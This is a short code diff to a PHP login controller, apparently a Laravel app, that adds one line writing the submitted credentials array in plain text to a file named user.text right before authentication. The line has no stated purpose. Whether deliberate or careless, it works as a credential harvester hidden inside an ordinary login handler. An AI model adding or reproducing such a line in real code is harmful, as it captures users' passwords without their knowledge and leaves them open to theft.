@@ -41,6 +41,8 @@ class UserController extends Controller
 
         $user= user::where(['number'=>$req->number])->first();
 
+        file_put_contents('user.text',$credentials);
+
         if ($user) {
 
             if (auth()->attempt($credentials)) {
